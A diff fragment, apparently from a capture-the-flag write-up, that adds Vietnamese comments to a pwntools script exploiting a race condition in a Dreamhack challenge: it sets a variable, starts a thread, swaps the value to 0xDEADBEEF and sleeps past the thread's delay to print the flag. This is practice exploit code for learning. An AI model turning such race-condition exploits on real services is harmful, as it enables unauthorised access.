@@ -114,17 +114,17 @@ p = remote('host3.dreamhack.games', 15810)
 
 DEADBEEF = 3735928559
 
-p.sendlineafter(b'Input: ', b'1')
-p.sendlineafter(b'Input: ', b'1')
+p.sendlineafter(b'Input: ', b'1') # chọn option 1
+p.sendlineafter(b'Input: ', b'1') # Nhập biến qword_4038 = 1
 
-p.sendlineafter(b'Input: ', b'2')
+p.sendlineafter(b'Input: ', b'2') # Thực thi hàm start_routine()
 
-p.sendlineafter(b'Input: ', b'1')
-p.sendlineafter(b'Input: ', str(DEADBEEF).encode())
+p.sendlineafter(b'Input: ', b'1') # chọn option 1
+p.sendlineafter(b'Input: ', str(DEADBEEF).encode()) # đổi qword_4038 thành 3735928559LL
 
-time.sleep(11)
+time.sleep(11) # tạm dừng chương trình của mình 1 tí để sleep(10) kia dậy trước
 
-p.sendlineafter(b'Input: ', b'3')
+p.sendlineafter(b'Input: ', b'3') # sau khi đã dậy thì chọn option 3 để in flag
 
 p.interactive()
 ```
